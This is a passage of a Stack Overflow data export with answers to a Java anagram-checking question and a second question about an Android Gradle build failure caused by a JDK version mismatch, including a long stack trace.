s2.toLowerCase();\r\n\t\t\r\n\t\tfor (int i=0; i&lt;s1.length();i++ ) {\r\n\t\t\t\t\t\t\t\t\t\r\n\t\t\t\tif (s2.contains(s1.charAt(i)+&quot;&quot;)) {\r\n\t\t\t\t\t\r\n\t\t\t\t\tcounter--;\t\t\t\t\r\n\t\t\t}\r\n\t\t}\r\n\t\t\r\n\t\tif (counter&lt;=0) {\r\n\t\t\t\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\treturn false;\r\n\t    }","title":"Anagram algorithm in java","body":"<ol>\n<li>Compare lengths of both strings if equal</li>\n<li>Convert both strings to lowercase so you can compare efficiently</li>\n<li>Loop  to check if String1 contains a character in String2. </li>\n<li><p>Set a counter to the length of one of the strings and decrease -1 when there's a match</p>\n\n<pre><code>public boolean isAnagram(String s1, String s2) {\n\nif(s1.length() != s2.length()) {\n    return false;\n}\n\nint counter= s1.length();\ns1 = s1.toLowerCase();\ns2= s2.toLowerCase();\n\nfor (int i=0; i&lt;s1.length();i++ ) {\n\n        if (s2.contains(s1.charAt(i)+\"\")) {\n\n            counter--;              \n    }\n}\n\nif (counter&lt;=0) {\n\n    return true;\n}\nreturn false;\n}\n</code></pre></li>\n</ol>\n"},{"tags":[],"owner":{"account_id":4687782,"reputation":914,"user_id":3794744,"display_name":"Vassilis"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1586518701,"creation_date":1586518701,"answer_id":61139480,"question_id":13692221,"body_markdown":"Using the Java streams this can be simplified in just 5 lines of code ([https://github.com/vspiliop/java-puzzles/blob/master/src/gy/etiolo/puzzles/streams/Anagrams.java][1]):\r\n\r\n    /**\r\n     * Are two strings anagrams.\r\n     */\r\n    public class Anagrams {\r\n      public static void main(String ... args) {\r\n        String word1 = &quot;abcdefg&quot;;\r\n        String word2 = &quot;gfedabc&quot;;\r\n    \r\n        System.out.println(&quot;Are they anagrams: &quot; + isAnagram(word1, word2));\r\n      }\r\n    \r\n      private static boolean isAnagram(String word1, String word2) {\r\n        int [] mask = new int[26];\r\n        Arrays.fill(mask, 0);\r\n        word1.toLowerCase().chars().forEach(c -&gt; mask[&#39;z&#39; - c]++);\r\n        word2.toLowerCase().chars().forEach(c -&gt; mask[&#39;z&#39; - c]--);\r\n        return Arrays.stream(mask).sum() == 0;\r\n      }\r\n    }\r\n\r\nCheck ascii table here: [http://www.asciitable.com/][2]\r\n\r\n\r\n  [1]: https://github.com/vspiliop/java-puzzles/blob/master/src/gy/etiolo/puzzles/streams/Anagrams.java\r\n  [2]: http://www.asciitable.com/","title":"Anagram algorithm in java","body":"<p>Using the Java streams this can be simplified in just 5 lines of code (<a href=\"https://github.com/vspiliop/java-puzzles/blob/master/src/gy/etiolo/puzzles/streams/Anagrams.java\" rel=\"nofollow noreferrer\">https://github.com/vspiliop/java-puzzles/blob/master/src/gy/etiolo/puzzles/streams/Anagrams.java</a>):</p>\n\n<pre><code>/**\n * Are two strings anagrams.\n */\npublic class Anagrams {\n  public static void main(String ... args) {\n    String word1 = \"abcdefg\";\n    String word2 = \"gfedabc\";\n\n    System.out.println(\"Are they anagrams: \" + isAnagram(word1, word2));\n  }\n\n  private static boolean isAnagram(String word1, String word2) {\n    int [] mask = new int[26];\n    Arrays.fill(mask, 0);\n    word1.toLowerCase().chars().forEach(c -&gt; mask['z' - c]++);\n    word2.toLowerCase().chars().forEach(c -&gt; mask['z' - c]--);\n    return Arrays.stream(mask).sum() == 0;\n  }\n}\n</code></pre>\n\n<p>Check ascii table here: <a href=\"http://www.asciitable.com/\" rel=\"nofollow noreferrer\">http://www.asciitable.com/</a></p>\n"},{"tags":[],"owner":{"account_id":219730,"reputation":20703,"user_id":476791,"accept_rate":67,"display_name":"slartidan"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1636378954,"creation_date":1636378954,"answer_id":69884463,"question_id":13692221,"body_markdown":"A solution, optimized for performance.\r\n\r\nWhat does differently to other solutions:\r\n\r\n* Only in the absolute worst case it **iterates once** through text1 and once through text2\r\n* **Fails fast**: returns false as soon as it encounters a character in text1 that is not part of text2\r\n* Stores histogram as **`int[]`**, which is much faster than HashMaps or similar\r\n* Can process strings with any character (even **emojis** &#128521;)\r\n\r\nExample Code:\r\n\r\n    public static boolean check(String text1, String text2) {\r\n        requireNonNull(text1, &quot;text1 must not be null&quot;);\r\n        requireNonNull(text2, &quot;text2 must not be null&quot;);\r\n        if (text1 == text2) return true;\r\n\r\n        var text1Chars = text1.toCharArray();\r\n        var text2Chars = text2.toCharArray();\r\n        if (text1Chars.length != text2Chars.length) return false;\r\n\r\n        var text2Counts = new int[Character.MAX_CODE_POINT];\r\n        var text2Index = 0;\r\n\r\n        loopThroughText1:\r\n        for (char charOfText1 : text1Chars) {\r\n            if (text2Counts[charOfText1] &gt; 0) {\r\n                text2Counts[charOfText1]--;\r\n            } else {\r\n                while (text2Index &lt; text2Chars.length) {\r\n                    var charOfText2 = text2Chars[text2Index++];\r\n                    if (charOfText1 == charOfText2) {\r\n                        continue loopThroughText1;\r\n                    }\r\n                    text2Counts[charOfText2]++;\r\n                }\r\n                return false;\r\n            }\r\n        }\r\n        return text2Index &gt;= text2Chars.length;\r\n    }\r\n\r\nThe corresponding test method:\r\n\r\n    @ParameterizedTest\r\n    @CsvSource({\r\n            &quot;a,a,true&quot;,\r\n            &quot;a,b,false&quot;,\r\n            &quot;aa,a,false&quot;,\r\n            &quot;a,aa,false&quot;,\r\n            &quot;aa,aa,true&quot;,\r\n            &quot;vhjsd682ahjsvdi7861rUZVFD/Ias6srf871r23,vhjsd682ahjsvdi7861rUZVFD/Ias6srf871r23,true&quot;,\r\n            &quot;A,a,false&quot;,\r\n            &quot;&#127880;,&#127880;,true&quot;,\r\n            &quot;&#127880;,&#128163;,false&quot;,\r\n    })\r\n    public void check(String text1, String text2, boolean expected) {\r\n        assertEquals(AnagramChecker.check(text1, text2), expected);\r\n    }\r\n","title":"Anagram algorithm in java","body":"<p>A solution, optimized for performance.</p>\n<p>What does differently to other solutions:</p>\n<ul>\n<li>Only in the absolute worst case it <strong>iterates once</strong> through text1 and once through text2</li>\n<li><strong>Fails fast</strong>: returns false as soon as it encounters a character in text1 that is not part of text2</li>\n<li>Stores histogram as <strong><code>int[]</code></strong>, which is much faster than HashMaps or similar</li>\n<li>Can process strings with any character (even <strong>emojis</strong> 😉)</li>\n</ul>\n<p>Example Code:</p>\n<pre><code>public static boolean check(String text1, String text2) {\n    requireNonNull(text1, &quot;text1 must not be null&quot;);\n    requireNonNull(text2, &quot;text2 must not be null&quot;);\n    if (text1 == text2) return true;\n\n    var text1Chars = text1.toCharArray();\n    var text2Chars = text2.toCharArray();\n    if (text1Chars.length != text2Chars.length) return false;\n\n    var text2Counts = new int[Character.MAX_CODE_POINT];\n    var text2Index = 0;\n\n    loopThroughText1:\n    for (char charOfText1 : text1Chars) {\n        if (text2Counts[charOfText1] &gt; 0) {\n            text2Counts[charOfText1]--;\n        } else {\n            while (text2Index &lt; text2Chars.length) {\n                var charOfText2 = text2Chars[text2Index++];\n                if (charOfText1 == charOfText2) {\n                    continue loopThroughText1;\n                }\n                text2Counts[charOfText2]++;\n            }\n            return false;\n        }\n    }\n    return text2Index &gt;= text2Chars.length;\n}\n</code></pre>\n<p>The corresponding test method:</p>\n<pre><code>@ParameterizedTest\n@CsvSource({\n        &quot;a,a,true&quot;,\n        &quot;a,b,false&quot;,\n        &quot;aa,a,false&quot;,\n        &quot;a,aa,false&quot;,\n        &quot;aa,aa,true&quot;,\n        &quot;vhjsd682ahjsvdi7861rUZVFD/Ias6srf871r23,vhjsd682ahjsvdi7861rUZVFD/Ias6srf871r23,true&quot;,\n        &quot;A,a,false&quot;,\n        &quot;🎈,🎈,true&quot;,\n        &quot;🎈,💣,false&quot;,\n})\npublic void check(String text1, String text2, boolean expected) {\n    assertEquals(AnagramChecker.check(text1, text2), expected);\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1021725,"reputation":10018,"user_id":1031887,"accept_rate":77,"display_name":"phatfingers"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1648177832,"creation_date":1648177832,"answer_id":71611744,"question_id":13692221,"body_markdown":"I&#39;m adding this as a unique O(n) approach, although, much like a hash comparison, it really only determines whether it&#39;s highly probable that two strings are anagrams of each other rather than providing complete certainty.\r\n\r\n    public static boolean isAnagram(String s1, String s2) {\r\n        if (s1.length()!=s2.length()) return false;\r\n        int sum1=0, sum2=0;\r\n        int xor1=0, xor2=0;\r\n        int prod1=1, prod2=1;\r\n        for (int i=0; i&lt;s1.length(); i++) {\r\n            char c1=s1.charAt(i);\r\n            char c2=s2.charAt(i);\r\n            sum1 += c1;\r\n            sum2 += c2;\r\n            xor1 ^= c1;\r\n            xor2 ^= c2;\r\n            prod1 *= c1;\r\n            prod2 *= c2;\r\n        }\r\n        return sum1==sum2 &amp;&amp; xor1==xor2 &amp;&amp; prod1==prod2;\r\n    }","title":"Anagram algorithm in java","body":"<p>I'm adding this as a unique O(n) approach, although, much like a hash comparison, it really only determines whether it's highly probable that two strings are anagrams of each other rather than providing complete certainty.</p>\n<pre><code>public static boolean isAnagram(String s1, String s2) {\n    if (s1.length()!=s2.length()) return false;\n    int sum1=0, sum2=0;\n    int xor1=0, xor2=0;\n    int prod1=1, prod2=1;\n    for (int i=0; i&lt;s1.length(); i++) {\n        char c1=s1.charAt(i);\n        char c2=s2.charAt(i);\n        sum1 += c1;\n        sum2 += c2;\n        xor1 ^= c1;\n        xor2 ^= c2;\n        prod1 *= c1;\n        prod2 *= c2;\n    }\n    return sum1==sum2 &amp;&amp; xor1==xor2 &amp;&amp; prod1==prod2;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":25233427,"reputation":1,"user_id":19068296,"display_name":"Nikolay"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1652082236,"creation_date":1652030215,"answer_id":72163437,"question_id":13692221,"body_markdown":"I think here&#39;s more readable and easy way to solve this problem. Complexity is O(n) and two maps only\r\n\r\n    public static boolean isAnagram(String word, String word2) {\r\n\r\n    if (word.equals(word2)) return true;\r\n    if (word == null || word2 == null) return false;\r\n    if (word.length() != word2.length()) return false;\r\n\r\n    Map&lt;Character, Integer&gt; map = new HashMap&lt;&gt;();\r\n    Map&lt;Character, Integer&gt; map2 = new HashMap&lt;&gt;();\r\n\r\n    for (int i = 0; i &lt; word.length(); i++) {\r\n        map.merge(word.charAt(i), 1, (oldVal, value) -&gt; oldVal++);\r\n    }\r\n\r\n    for (int i = 0; i &lt; word2.length(); i++) {\r\n        map2.merge(word2.charAt(i), 1, (oldVal, value) -&gt; oldVal++);\r\n    }\r\n\r\n    return map.equals(map2);\r\n}","title":"Anagram algorithm in java","body":"<p>I think here's more readable and easy way to solve this problem. Complexity is O(n) and two maps only</p>\n<pre><code>public static boolean isAnagram(String word, String word2) {\n\nif (word.equals(word2)) return true;\nif (word == null || word2 == null) return false;\nif (word.length() != word2.length()) return false;\n\nMap&lt;Character, Integer&gt; map = new HashMap&lt;&gt;();\nMap&lt;Character, Integer&gt; map2 = new HashMap&lt;&gt;();\n\nfor (int i = 0; i &lt; word.length(); i++) {\n    map.merge(word.charAt(i), 1, (oldVal, value) -&gt; oldVal++);\n}\n\nfor (int i = 0; i &lt; word2.length(); i++) {\n    map2.merge(word2.charAt(i), 1, (oldVal, value) -&gt; oldVal++);\n}\n\nreturn map.equals(map2);\n</code></pre>\n<p>}</p>\n"},{"tags":[],"owner":{"account_id":26839727,"reputation":1,"user_id":20426426,"display_name":"Kumar G"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1668279630,"creation_date":1667662594,"answer_id":74329123,"question_id":13692221,"body_markdown":"```\r\npublic static boolean isAnagram(String str1, String str2){\r\n    if(str1.length() != str2.length())\r\n      return false;\r\n    int lengthStr1 = str1.length();\r\n    for(char c : str2.toCharArray()) {\r\n       str1 = str1.replaceFirst(c+&quot;&quot;, &quot;&quot;);\r\n    if(str1.length() == lengthStr1--)\r\n       return false;\r\n    }\r\n    return true;\r\n}","title":"Anagram algorithm in java","body":"<pre><code>public static boolean isAnagram(String str1, String str2){\n    if(str1.length() != str2.length())\n      return false;\n    int lengthStr1 = str1.length();\n    for(char c : str2.toCharArray()) {\n       str1 = str1.replaceFirst(c+&quot;&quot;, &quot;&quot;);\n    if(str1.length() == lengthStr1--)\n       return false;\n    }\n    return true;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":4990101,"reputation":475,"user_id":4012589,"display_name":"Michel Dambros Figueiredo"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683726457,"creation_date":1683726457,"answer_id":76219213,"question_id":13692221,"body_markdown":"You can use a combination of Streams and maths as in:\r\n\r\n    public static boolean isAnagram(String s1, String s2){\r\n        if ( s1.length() != s2.length() ) {\r\n            return false;\r\n        }\r\n        int s1Sum = s1.chars().sum();\r\n        int s2Sum = s2.chars().sum();\r\n        return s1Sum == s2Sum;\r\n    }","title":"Anagram algorithm in java","body":"<p>You can use a combination of Streams and maths as in:</p>\n<pre><code>public static boolean isAnagram(String s1, String s2){\n    if ( s1.length() != s2.length() ) {\n        return false;\n    }\n    int s1Sum = s1.chars().sum();\n    int s2Sum = s2.chars().sum();\n    return s1Sum == s2Sum;\n}\n</code></pre>\n"}],"owner":{"account_id":2108008,"reputation":249,"user_id":1873885,"accept_rate":27,"display_name":"SemihY"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":62551,"favorite_count":0,"down_vote_count":3,"up_vote_count":13,"answer_count":38,"score":10,"last_activity_date":1683726457,"creation_date":1354570844,"question_id":13692221,"body_markdown":"I would like to make anagram algorithm but\r\nThis code doesn&#39;t work. Where is my fault ? \r\nFor example des and sed is anagram but output is not anagram\r\nMeanwhile I have to use string method. not array. :)\r\n\r\n    public static boolean isAnagram(String s1 , String s2)\r\n    {\r\n        String delStr=&quot;&quot;;\r\n        String newStr=&quot;&quot;;\r\n    \r\n        for(int i=0;i&lt;s1.length();i++)\r\n        {\r\n            for(int j=0 ; j &lt; s2.length() ; j++)\r\n            {\r\n                if(s1.charAt(i)==s2.charAt(j))\r\n                {\r\n                    delStr=s1.substring(i,i+1);\r\n                    newStr=s2.replace(delStr,&quot;&quot;);\r\n                }\r\n            }\t\t\t\r\n        }\r\n    \r\n        if(newStr.equals(&quot;&quot;))\r\n            return true;\r\n        else\r\n            return false;\r\n    }","title":"Anagram algorithm in java","body":"<p>I would like to make anagram algorithm but\nThis code doesn't work. Where is my fault ? \nFor example des and sed is anagram but output is not anagram\nMeanwhile I have to use string method. not array. :)</p>\n\n<pre><code>public static boolean isAnagram(String s1 , String s2)\n{\n    String delStr=\"\";\n    String newStr=\"\";\n\n    for(int i=0;i&lt;s1.length();i++)\n    {\n        for(int j=0 ; j &lt; s2.length() ; j++)\n        {\n            if(s1.charAt(i)==s2.charAt(j))\n            {\n                delStr=s1.substring(i,i+1);\n                newStr=s2.replace(delStr,\"\");\n            }\n        }           \n    }\n\n    if(newStr.equals(\"\"))\n        return true;\n    else\n        return false;\n}\n</code></pre>\n"},{"tags":["java","android","reactjs","android-studio","capacitor"],"comments":[{"owner":{"account_id":50585,"reputation":39940,"user_id":150978,"accept_rate":78,"display_name":"Robert"},"score":1,"creation_date":1683661469,"post_id":76212764,"comment_id":134400278,"body_markdown":"The error text speaks yout modules which had been introduced after Java 8, so your Gradle is using the wrong JDK most likely a JDK 11 or 17. Kill all Gradle instances, Set JAVA_HOME environment variable to JDK 8 and retry if you are directly using Gradle on command line. In Android studio that are special settings for the JDK to be used by Gradle.","body":"The error text speaks yout modules which had been introduced after Java 8, so your Gradle is using the wrong JDK most likely a JDK 11 or 17. Kill all Gradle instances, Set JAVA_HOME environment variable to JDK 8 and retry if you are directly using Gradle on command line. In Android studio that are special settings for the JDK to be used by Gradle."},{"owner":{"account_id":9894393,"reputation":441,"user_id":7326401,"display_name":"Viroth"},"score":0,"creation_date":1683698609,"post_id":76212764,"comment_id":134404436,"body_markdown":"Try to update all updatable libraries, services, plugins.","body":"Try to update all updatable libraries, services, plugins."}],"answers":[{"tags":[],"owner":{"account_id":1428527,"reputation":52235,"user_id":1351469,"accept_rate":100,"display_name":"jcesarmobile"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683726105,"creation_date":1683726105,"answer_id":76219167,"question_id":76212764,"body_markdown":"For using Gradle 7.5 you should be using Gradle plugin 7.\r\nFor using Gradle plugin 7 you have to use java 11.\r\n\r\nCheck the `android/build.gradle` file and check the version of `com.android.tools.build:gradle`.\r\nIf it’s 7.x.x already, make sure you are using java 11 and not 8.\r\nIf you want to use java 8, then use the latest 4.x.x as that’s the one that works with java 8.","title":"Build android failed - Execution failed for task &#39;:app:processDebugMainManifest&#39;","body":"<p>For using Gradle 7.5 you should be using Gradle plugin 7.\nFor using Gradle plugin 7 you have to use java 11.</p>\n<p>Check the <code>android/build.gradle</code> file and check the version of <code>com.android.tools.build:gradle</code>.\nIf it’s 7.x.x already, make sure you are using java 11 and not 8.\nIf you want to use java 8, then use the latest 4.x.x as that’s the one that works with java 8.</p>\n"}],"owner":{"account_id":21636062,"reputation":59,"user_id":15958966,"display_name":"Ndango"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":979,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1683726105,"creation_date":1683660023,"question_id":76212764,"body_markdown":"I am trying to build an old project I was working on last year and now it keeps failing when building on android studio. It worked fine a couple of months ago, but now on the second version it is struggling to build, since updating my Macbook.\r\n\r\nUsing JDK 1.8. +\r\nGradle version 7.5\r\n\r\nThis is what i found looking at --stack trace\r\n\r\n```\r\nExecution failed for task &#39;:app:processDebugMainManifest&#39;.\r\n&gt; Unable to make field private final java.lang.String java.io.File.path accessible: module java.base does not &quot;opens java.io&quot; to unnamed module @7735a62e\r\n\r\n* Try:\r\n&gt; Run with --info or --debug option to get more log output.\r\n&gt; Run with --scan to get full insights.\r\n\r\n* Exception is:\r\norg.gradle.api.tasks.TaskExecutionException: Execution failed for task &#39;:app:processDebugMainManifest&#39;.\r\n\tat org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.lambda$executeIfValid$1(ExecuteActionsTaskExecuter.java:142)\r\n\tat org.gradle.internal.Try$Failure.ifSuccessfulOrElse(Try.java:282)\r\n\tat org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.executeIfValid(ExecuteActionsTaskExecuter.java:140)\r\n\tat org.gradle.api.internal.tasks.execution.ExecuteActionsTaskExecuter.execute(ExecuteActionsTaskExecuter.java:128)\r\n\tat org.gradle.api.internal.tasks.execution.CleanupStaleOutputsExecuter.execute(CleanupStaleOutputsExecuter.java:77)\r\n\tat org.gradle.api.internal.tasks.execution.FinalizePropertiesTaskExecuter.execute(FinalizePropertiesTaskExecuter.java:46)\r\n\tat org.gradle.api.internal.tasks.execution.ResolveTaskExecutionModeExecuter.execute(ResolveTaskExecutionModeExecuter.java:51)\r\n\tat org.gradle.api.internal.tasks.execution.SkipTaskWithNoActionsExecuter.execute(SkipTaskWithNoActionsExecuter.java:57)\r\n\tat org.gradle.api.internal.tasks.execution.SkipOnlyIfTaskExecuter.execute(SkipOnlyIfTaskExecuter.java:56)\r\n\tat org.gradle.api.internal.tasks.execution.CatchExceptionTaskExecuter.execute(CatchExceptionTaskExecuter.java:36)\r\n\tat org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.executeTask(EventFiringTaskExecuter.java:77)\r\n\tat org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.call(EventFiringTaskExecuter.java:55)\r\n\tat org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter$1.call(EventFiringTaskExecuter.java:52)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:204)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:199)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:66)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:59)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:157)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:59)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner.call(DefaultBuildOperationRunner.java:53)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationExecutor.call(DefaultBuildOperationExecutor.java:73)\r\n\tat org.gradle.api.internal.tasks.execution.EventFiringTaskExecuter.execute(EventFiringTaskExecuter.java:52)\r\n\tat org.gradle.execution.plan.LocalTaskNodeExecutor.execute(LocalTaskNodeExecutor.java:69)\r\n\tat org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$InvokeNodeExecutorsAction.execute(DefaultTaskExecutionGraph.java:327)\r\n\tat org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$InvokeNodeExecutorsAction.execute(DefaultTaskExecutionGraph.java:314)\r\n\tat org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.execute(DefaultTaskExecutionGraph.java:307)\r\n\tat org.gradle.execution.taskgraph.DefaultTaskExecutionGraph$BuildOperationAwareExecutionAction.execute(DefaultTaskExecutionGraph.java:293)\r\n\tat org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.execute(DefaultPlanExecutor.java:417)\r\n\tat org.gradle.execution.plan.DefaultPlanExecutor$ExecutorWorker.run(DefaultPlanExecutor.java:339)\r\n\tat org.gradle.internal.concurrent.ExecutorPolicy$CatchAndRecordFailures.onExecute(ExecutorPolicy.java:64)\r\n\tat org.gradle.internal.concurrent.ManagedExecutorImpl$1.run(ManagedExecutorImpl.java:48)\r\nCaused by: java.lang.reflect.InaccessibleObjectException: Unable to make field private final java.lang.String java.io.File.path accessible: module java.base does not &quot;opens java.io&quot; to unnamed module @7735a62e\r\n\tat com.google.gson.internal.reflect.UnsafeReflectionAccessor.makeAccessible(UnsafeReflectionAccessor.java:44)\r\n\tat com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.getBoundFields(ReflectiveTypeAdapterFactory.java:159)\r\n\tat com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.create(ReflectiveTypeAdapterFactory.java:102)\r\n\tat com.google.gson.Gson.getAdapter(Gson.java:458)\r\n\tat com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.createBoundField(ReflectiveTypeAdapterFactory.java:117)\r\n\tat com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.getBoundFields(ReflectiveTypeAdapterFactory.java:166)\r\n\tat com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.create(ReflectiveTypeAdapterFactory.java:102)\r\n\tat com.google.gson.Gson.getAdapter(Gson.java:458)\r\n\tat com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.createBoundField(ReflectiveTypeAdapterFactory.java:117)\r\n\tat com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.getBoundFields(ReflectiveTypeAdapterFactory.java:166)\r\n\tat com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.create(ReflectiveTypeAdapterFactory.java:102)\r\n\tat com.google.gson.Gson.getAdapter(Gson.java:458)\r\n\tat com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.createBoundField(ReflectiveTypeAdapterFactory.java:117)\r\n\tat com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.getBoundFields(ReflectiveTypeAdapterFactory.java:166)\r\n\tat com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.create(ReflectiveTypeAdapterFactory.java:102)\r\n\tat com.google.gson.Gson.getAdapter(Gson.java:458)\r\n\tat com.google.gson.internal.bind.CollectionTypeAdapterFactory.create(CollectionTypeAdapterFactory.java:53)\r\n\tat com.google.gson.Gson.getAdapter(Gson.java:458)\r\n\tat com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.createBoundField(ReflectiveTypeAdapterFactory.java:117)\r\n\tat com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.getBoundFields(ReflectiveTypeAdapterFactory.java:166)\r\n\tat com.google.gson.internal.bind.ReflectiveTypeAdapterFactory.create(ReflectiveTypeAdapterFactory.java:102)\r\n\tat com.google.gson.Gson.getAdapter(Gson.java:458)\r\n\tat com.google.gson.internal.bind.ArrayTypeAdapter$1.create(ArrayTypeAdapter.java:48)\r\n\tat com.google.gson.Gson.getAdapter(Gson.java:458)\r\n\tat com.google.gson.Gson.fromJson(Gson.java:931)\r\n\tat com.google.gson.Gson.fromJson(Gson.java:897)\r\n\tat com.google.gson.Gson.fromJson(Gson.java:846)\r\n\tat com.google.gson.Gson.fromJson(Gson.java:817)\r\n\tat com.android.manifmerger.ManifestMerger2.createNavigationMap(ManifestMerger2.java:492)\r\n\tat com.android.manifmerger.ManifestMerger2.merge(ManifestMerger2.java:341)\r\n\tat com.android.manifmerger.ManifestMerger2.access$600(ManifestMerger2.java:74)\r\n\tat com.android.manifmerger.ManifestMerger2$Invoker.merge(ManifestMerger2.java:1894)\r\n\tat com.android.build.gradle.internal.tasks.manifest.ManifestHelperKt.mergeManifests(ManifestHelper.kt:83)\r\n\tat com.android.build.gradle.tasks.ProcessApplicationManifest.doFullTaskAction(ProcessApplicationManifest.kt:144)\r\n\tat com.android.build.gradle.internal.tasks.IncrementalTask.handleIncrementalInputs(IncrementalTask.kt:110)\r\n\tat com.android.build.gradle.internal.tasks.IncrementalTask.access$handleIncrementalInputs(IncrementalTask.kt:65)\r\n\tat com.android.build.gradle.internal.tasks.IncrementalTask$taskAction$$inlined$recordTaskAction$1.invoke(BaseTask.kt:62)\r\n\tat com.android.build.gradle.internal.tasks.Blocks.recordSpan(Blocks.java:51)\r\n\tat com.android.build.gradle.internal.tasks.IncrementalTask.taskAction$gradle_core(IncrementalTask.kt:137)\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n\tat java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)\r\n\tat java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)\r\n\tat org.gradle.internal.reflect.JavaMethod.invoke(JavaMethod.java:125)\r\n\tat org.gradle.api.internal.project.taskfactory.IncrementalTaskInputsTaskAction.doExecute(IncrementalTaskInputsTaskAction.java:47)\r\n\tat org.gradle.api.internal.project.taskfactory.StandardTaskAction.execute(StandardTaskAction.java:51)\r\n\tat org.gradle.api.internal.project.taskfactory.AbstractIncrementalTaskAction.execute(AbstractIncrementalTaskAction.java:25)\r\n\tat org.gradle.api.internal.project.taskfactory.StandardTaskAction.execute(StandardTaskAction.java:29)\r\n\tat org.gradle.api.internal.tasks.execution.TaskExecution$3.run(TaskExecution.java:236)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner$1.execute(DefaultBuildOperationRunner.java:29)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner$1.execute(DefaultBuildOperationRunner.java:26)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:66)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:59)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:157)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:59)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner.run(DefaultBuildOperationRunner.java:47)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationExecutor.run(DefaultBuildOperationExecutor.java:68)\r\n\tat org.gradle.api.internal.tasks.execution.TaskExecution.executeAction(TaskExecution.java:221)\r\n\tat org.gradle.api.internal.tasks.execution.TaskExecution.executeActions(TaskExecution.java:204)\r\n\tat org.gradle.api.internal.tasks.execution.TaskExecution.executeWithPreviousOutputFiles(TaskExecution.java:187)\r\n\tat org.gradle.api.internal.tasks.execution.TaskExecution.execute(TaskExecution.java:165)\r\n\tat org.gradle.internal.execution.steps.ExecuteStep.executeInternal(ExecuteStep.java:89)\r\n\tat org.gradle.internal.execution.steps.ExecuteStep.access$000(ExecuteStep.java:40)\r\n\tat org.gradle.internal.execution.steps.ExecuteStep$1.call(ExecuteStep.java:53)\r\n\tat org.gradle.internal.execution.steps.ExecuteStep$1.call(ExecuteStep.java:50)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:204)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner$CallableBuildOperationWorker.execute(DefaultBuildOperationRunner.java:199)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:66)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner$2.execute(DefaultBuildOperationRunner.java:59)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:157)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner.execute(DefaultBuildOperationRunner.java:59)\r\n\tat org.gradle.internal.operations.DefaultBuildOperationRunner.call(DefaultBuildOperationRunner.java:53)\r\n\tat 